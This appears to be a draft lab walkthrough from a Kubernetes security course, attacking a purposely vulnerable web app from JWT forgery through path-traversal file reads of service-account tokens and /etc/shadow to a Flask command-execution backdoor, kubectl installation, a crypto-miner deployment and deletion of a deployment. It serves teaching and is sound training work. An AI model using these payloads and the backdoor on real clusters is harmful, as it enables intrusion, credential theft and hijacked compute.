# Exploit Application Vulnerabilities

Application vulnerabilities can bring wide range of different *attack entrypoints*. In addition to Kubernetes-specific vulnerabilities and misconfigurations, this can lead to various beautiful attacks.


## Demo: run a crypto-miner in the cluster

### Attack description:
- **Setup**: a K8s cluster with a web application deployed
- **Attacker**: an external user without any access to the cluster
- **Target**: kubectl access to the cluster (then: cluster compute resources, cluster availability, application data, more)
- **Entrypoint**: web application


## Steps to reproduce

<!-- TODO: выбросить, смерджить с Attacks -->

1. deploy [vulnerable-app](vulnerable-app) (both `auth-api` and `images-api`) and `another-app` (empty)
2. explore the [images service]()

2. Go to [auth service](http://auth.vulnapp.seck8s.slurm.io/)
3. Sign-up any user and login
4. Get redirection to the [image service](https://images.vulnapp.seck8s.slurm.io/) with the greatest cat in the world :)
5. Decode JWT token and try to get more privileges
6. Write any interesting file (take a look at the image b64 data you'll receive)
7. Upload any interesting file (note: the container runs as root so you're relatively free)
8. Get working `kubectl` for the cluster


## Attack
2. register a test user in `auth-api`, get the JWT (with `user_role='user'`)
3. proceed to `images-api` with the JWT token, see the image (partially logged in)
<!-- > TODO: Show in dashboard : http://rus-vote.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api/logs -->
<!-- JWT:
1) architecture issue: symmetric algo (HS256 not RS256) => both services use the same secret and can issue a new jwt
    look: our secret leaked from images service (LINK)
2) weak secret: can crack (https://github.com/lmammino/jwt-cracker)
3) privilege escalation
 -->
1. get the `SECRET_KEY`:
  - either find the [leaked value](http://rus-vote.seck8s.slurm.io/clusters/local/namespaces/vulnapp/deployments/images-api) in the exposed unprotected Dashboard
  - or check the Git commit history (`git blame`) to find the hard-coded secret in sources *vulnerability: [hard-coded credentials](https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_password)*
  <!-- TODO: link to github -->
4. decode the JWT token using the leaked secret key and modify `user_role='admin'` (*vulnerability: [Broken User Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication)*)
<!-- TODO: link to

https://github.com/Slurmio/webinar-seck8s/blob/60a70a81d8c4d86e1df0994eb14b7aadf9732b86/03-appsec/vulnerable-app/images-api/app.py#L23-L31
-->

<!-- NB: Source code is not secret -->

5. proceed to `images-api` with the new token, see the admin page
6. read some files: `../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token`, `../app.py`, `../../../../../../etc/shadow`, `../../../../../../etc/shadow/proc/1/environ`, etc.: (*vulnerability: [LFI, Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)*)

> Note: inside the pod, kubectl is authenticated to the pod's SA. However, you could save SA's `token` and `ca.crt` to your local machine and, knowing the Kube API public URI, you can acess it remotely:
> ```kubectl --server=https://kubernetes.default.svc --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) <command>```

7. write the `./app.py` with backdoor activated via GET parameter `cmd` ([Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload))
    ```python
    ...
    @app.route("/", methods=["GET"])
    def home():
        cmd = request.args.get('cmd')
        if cmd:
            import subprocess
            p = subprocess.run(["bash", "-c", cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
            return p.stdout.decode()
        ...
    ```
    <!-- TODO: use pre-prepared payload app.py -->
    <!-- TODO: use curl not burp -->
8. since the server is in Debug mode, it auto-reloads without restarting the pod
9. use the backdoor to install `kubectl`:
    <!-- we're in Ubuntu, and root => apt-get  -->
    <!-- TODO: kubectl get all -->
    <!-- TODO: curl -->
  - `?cmd=apt-get+update`
  - `?cmd=apt-get+-y+install+curl`
  - Next, from https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/ :
  - `?cmd=curl%20-LO%20%22https://dl.k8s.io/release/$(curl%20-L%20-s%20https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl%22`
  - `?cmd=install%20-o%20root%20-g%20root%20-m%200755%20kubectl%20/usr/local/bin/kubectl`
  - `?cmd=kubectl+get+all`

<!-- TODO : 'kubectl cluster-info dump' -->

10. now you can use kubectl configured to the workload's service account (deploy a miner): `?cmd=kubectl+apply+-f+images/monero-deployment.yaml`
11. or shut down the cluster's payload (Deployment only, permitted by RBAC): `?cmd=kubectl+delete+deployment+auth-api`


# Takeaways
<!-- TODO: -->
